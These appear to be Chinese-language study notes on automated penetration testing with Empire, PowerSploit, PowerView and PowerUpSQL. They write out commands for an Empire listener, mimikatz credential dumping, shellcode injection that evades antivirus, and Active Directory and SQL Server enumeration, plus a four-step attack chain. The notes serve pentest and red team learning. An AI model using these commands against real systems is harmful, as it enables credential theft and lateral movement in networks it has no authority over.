# 自動化攻擊

## 自動化攻擊概述

- **Automated Attacks**（自動化攻擊）：使用腳本和自動化工具來利用系統和網路中的漏洞
  - 允許攻擊者快速且重複地執行複雜任務，提高攻擊效率和範圍
  - 對於滲透測試執行和防禦都是必要的知識

## Bash 自動化攻擊

- **Bash Scripting**（Bash 腳本編寫）：用於自動化例行任務
  - 可自動化資料收集、解析和執行複雜的命令序列

## Windows 攻擊框架

- **Empire and PowerSploit**（Empire 和 PowerSploit）：Windows 域滲透測試工具
  - 提供後漏洞利用模組，例如權限提升、建立持久性和資料竊取

- **PowerView**：進階 Windows 環境列舉工具
  - 用於獲取 Windows 環境的深入洞察，提高網路環境感知能力

- **PowerUpSQL**：SQL 伺服器利用工具
  - 設計用於利用 SQL 伺服器系統，允許命令執行和角色提升

- **AD Search**（活動目錄搜尋）：自動化活動目錄搜尋工具
  - 自動搜尋活動目錄以發現有價值信息和潛在提權區域

## 網路攻擊工具

- **Impacket**（網路協議工具包）：Python 類和腳本套件
  - 用於處理網路協議和篡改數據包以利用網路服務實現中的漏洞
  - 提供對數據包的低級程式化存取，實現某些協議（如 SMB1-3 和 MSRPC）的實現
  - 包含許多強大工具，如 [secretsdump](https://knowledge.complexsecurity.io/tools/secretsdump/)，可從 Windows 系統提取憑證、NTLM 密碼雜湊和 LSA 機密
  - 可用於[橫向移動](https://www.youtube.com/watch?v=0IMSkbUKlSs)，如 addcomputer.py 工具允許在活動目錄中添加電腦帳號

- **Scrapy**（數據包製作工具）：數據包製作和操作工具
  - 用於執行複雜攻擊的數據包操作

## 攻擊模擬框架

- **Caldera**（自動化對手模擬系統）：使用預定義的戰術和技術模擬完整規模的攻擊
  - 為滲透測試人員提供重要工具

- **Infection Monkey**（入侵猴子）：入侵和攻擊模擬工具
  - 用於測試 IT 環境對網路攻擊的抵抗力

- **Atomic Red Team**（原子紅隊）：基於 MITRE ATT&CK 框架的模擬工具
  - 允許小型、可攜式和模組化測試，模擬已知惡意攻擊和技術
  - 提供全面的方法來增強系統防禦

# Empire 與 PowerSploit 框架

## Empire 框架

- **Empire**（後期利用框架）：
  - 允許運行 PowerShell 代理而無需 PowerShell.exe，有助於規避檢測
  - 提供用於憑證收集、橫向移動和持久性任務的模組
  - 適用於已獲得初始存取權限並需要維持控制和橫向移動的情境

- **Empire Listener**（監聽器）：
  - 一種等待代理回連的伺服器
  - 設定基本監聽器的命令：`uselistener http` → `set Host http://your-ip-address` → `execute`
  - 監聽器執行後，需在目標機器上執行payload以建立連接

- **Empire Agent**（代理）：
  - 連接到Empire監聽器的程序
  - 允許執行各種後期利用模組
  - 憑證收集範例：`usemodule credentials/mimikatz/logonpasswords` → `execute`

## PowerSploit 框架

- **PowerSploit**（PowerShell腳本集合）：
  - 用於後期利用、偵察和漏洞利用的PowerShell腳本框架
  - 包含在Empire中，也可獨立使用
  - 主要功能包括權限提升、代碼執行等
  - 詳細模組分類：[stationx.net](https://www.stationx.net/how-to-use-powersploit/)、[attack.mitre.org](https://attack.mitre.org/software/S0194/)

- **PowerSploit Privesc**（權限提升套件）：
  - 用於檢查Windows機器上權限提升機會的模組
  - 使用命令：`Import-module PowerSploit/Privesc` → `Invoke-Allchecks`
  - 自動識別常見錯誤配置和漏洞

- **Invoke-Shellcode**（Shellcode注入模組）：
  - 允許直接將Shellcode注入運行進程的記憶體
  - 避免接觸磁碟，規避反病毒解決方案檢測
  - 使用命令：`Import-module PowerSploit/CodeExecution` → `Invoke-Shellcode -ProcessID 1234 -Shellcode (Get-Content shellcode.bin)`

## PowerSploit 主要功能模組 

- **CodeExecution**（代碼執行）：
  - 可在目標機器上執行程式碼
  - 包含多種注入方式：DLL注入、反射PE注入、Shellcode注入等
  - 例如：`Invoke-DllInjection`、`Invoke-ReflectivePEInjection`、`Invoke-WmiCommand` [pentestit.com](https://pentestit.com/powersploit-post-exploitation-framework/)

- **Credential Harvesting**（憑證收集）：
  - `Invoke-CredentialInjection`：建立明文憑證登錄而不觸發可疑事件ID
  - `Invoke-Mimikatz`：在記憶體中反射載入Mimikatz 2.0，無需寫入磁碟即可轉儲憑證
  - `Invoke-NinjaCopy`：通過讀取原始卷和解析NTFS結構來複製文件 [powersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/)

## 綜合利用示例

- **完整攻擊鏈自動化**：
  1. 初始存取：部署Empire代理到目標機器
  2. 權限提升：使用PowerSploit的`Invoke-Allchecks`識別可能的提升路徑
  3. 憑證轉儲：使用提升的權限和Empire的Mimikatz模組提取憑證
  4. 橫向移動：利用獲取的憑證進行網絡橫向移動

- **使用提示**：
  - 如果使用PowerShell v3，可通過以下命令移除安全警告：
    ```powershell
    $Env:PSModulePath.Split(';') | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }
    ```
  - 透過`Import-Module PowerSploit`匯入模組
  - 使用`Get-Command -Module PowerSploit`查看可用命令 [github.com/ZeroDayLab](https://github.com/ZeroDayLab/PowerSploit)

# PowerView

## 基本介紹

- **PowerView**（PowerView）：一個 PowerShell 工具集，屬於 PowerSploit 框架的一部分，專為自動化活動目錄環境偵察任務設計
  - 主要用於繪製活動目錄環境的結構圖，包括識別用戶、群組、電腦及它們之間的關係
  - 通過自動化偵察過程，能快速獲取 AD 環境的全景，有助於規劃滲透測試後續步驟

## 主要功能

### 使用者相關命令

- **Get-NetUser**：列出域中所有用戶賬戶
  - 可用於分析潛在目標，如具有特權的帳戶或長期未使用的賬戶
  - 範例：`Get-NetUser | select cn` 只顯示用戶的通用名稱 (CN)

### 群組相關命令

- **Get-NetGroup** / **Get-DomainGroup**：列出域中所有群組
  - 有助於了解權限結構和資源訪問控制
  - 範例：`Get-NetGroup -GroupName *Admin*` 查找名稱中包含 "Admin" 的所有域群組

- **Get-NetGroupMember** / **Get-DomainGroupMember**：找出特定群組的所有成員
  - 範例：`Get-NetGroupMember -GroupName "Domain Admins"`
  - 可使用 `-Recurse` 參數遞歸查詢子群組成員：`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
  - 可指定域：`Get-DomainGroupMember -Identity "Enterprise Admins" -Domain domain.lab`

### 電腦相關命令

- **Get-NetComputer** / **Get-DomainComputer**：列出域中所有電腦
  - 對規劃橫向移動或識別可能易受攻擊的系統很重要
  - 可根據操作系統篩選：`Get-DomainComputer -OperatingSystem "*Server 2022*"`

### 域信任相關命令

- **Get-NetDomainTrust**：顯示當前域與其他域之間的信任關係
  - 特別適用於具有多個域的大型組織環境
  - 對於尋求擴大影響範圍到組織不同部分的攻擊非常重要

### 遠程主機會話命令

- **Get-NetSession**：識別遠程機器上的活動會話
  - 可找出特定用戶的登入位置，對於定位特定用戶帳戶很有用
  - 範例：`Get-NetSession -ComputerName TARGET_COMPUTER`

### 其他進階功能

- **Get-NetLocalGroup**：列出遠程電腦上的本地群組（需要管理員權限）
  - 範例：`Get-NetLocalGroup -ComputerName Computer1 -ListGroups`

- **Get-DomainGPO**：枚舉域群組策略對象
  - 範例：`Get-DomainGPO | select displayname`
  - 可針對特定電腦：`Get-DomainGPO -ComputerName WS01 | select displayname`

- **Convert-SidToName**：將安全標識符 (SID) 轉換為可讀名稱

# PowerUpSQL

## 基本概念

- **PowerUpSQL**（PowerShell SQL 伺服器攻擊工具）：一套 PowerShell 函數工具集，專為發現和利用 SQL Server 實例所設計
  - 主要功能包括：SQL Server 探索、弱配置審計、大規模權限提升和後滲透攻擊（如 OS 命令執行）
  - 主要用於內部滲透測試和紅隊演練，但也可作為系統管理員的資產盤點工具
  - 由 NetSPI 開發，主要貢獻者包括 Antti Rantasaari、Eric Gruber 和 Thomas Elling 等人

## 功能分類

### 探索功能（Discovery）

- **Get-SQLInstanceLocal**：掃描本地網路尋找 SQL Server 實例
  - 用法：`Get-SQLInstanceLocal -Verbose`
  - 返回發現的所有 SQL Server 伺服器清單

- **Get-SQLInstanceDomain**：探索域中的 SQL Server 實例
  - 可與其他命令結合使用，如：`Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose`

- **Get-SQLInstanceFile**：從文件載入已知的 SQL Server 實例
  - 用法：`Get-SQLInstanceFile -FilePath C:temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test`
  - 適用於已有實例列表的情況，每行一個實例名稱

### 信息收集功能

- **Get-SQLServerInfo**：收集 SQL Server 實例的詳細信息
  - 用法：`Get-SQLServerInfo -InstanceName "SQLSERVER01"`
  - 提供伺服器配置的全面概述，包括版本、用戶和資料行等信息

- **Get-SQLServerLink**：識別與特定 SQL Server 相連結的伺服器
  - 用法：`Get-SQLServerLink -Instance "SQLSERVER01"`
  - 顯示所有連結到指定伺服器的其他伺服器，有助於規劃橫向移動策略

### 權限提升功能

- **Invoke-SQLEscalatePriv**：嘗試在 SQL Server 上提升權限
  - 用法：`Invoke-SQLEscalatePriv -Instance "SQLSERVER01" -Verbose`
  - 自動嘗試多種提權方法，如利用存儲過程或其他常見漏洞

### 憑證檢測功能

- **Get-SQLServerLoginDefaultPw**：檢查 SQL Server 是否使用預設密碼
  - 結合使用：`Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose`
  - 檢查應用程式常用的預設密碼配置

### Active Directory 相關功能

- **Get-SQLDomainUser**：查詢域用戶信息，可根據特定狀態篩選
  - 用法：`Get-SQLDomainUser -UserState SmartCardRequired`（列出需要智慧卡的用戶）
  - 用法：`Get-SQLDomainUser -UserState TrustedForDelegation`（列出可委派的用戶）
  - 幫助識別潛在的高價值目標或應避免嘗試破解的帳戶

## 攻擊策略要點

- 優先識別並避免嘗試破解需要雙因素驗證（如智慧卡）的帳戶
- 尋找信任委派的帳戶，這些帳戶可以模擬其他用戶，有利於提權或橫向移動
- 利用伺服器連結進行橫向移動，從一個伺服器跳轉到另一個伺服器
- 自動化發現和評估過程可節省時間，提高發現漏洞的機率
